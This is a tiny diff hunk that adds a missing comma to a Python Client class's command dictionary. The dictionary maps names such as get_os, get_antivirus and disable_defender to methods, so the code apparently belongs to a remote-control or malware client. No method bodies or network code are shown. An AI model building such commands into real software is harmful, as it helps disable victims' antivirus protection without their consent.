@@ -59,7 +59,7 @@ class Client:
             "get_os":self.get_os,
             "get_bios":self.get_bios,
             "get_antivirus":self.get_antivirus,
-            "get_active": self.get_active
+            "get_active": self.get_active,
             "disable_defender": self.disable_defender
         }
 
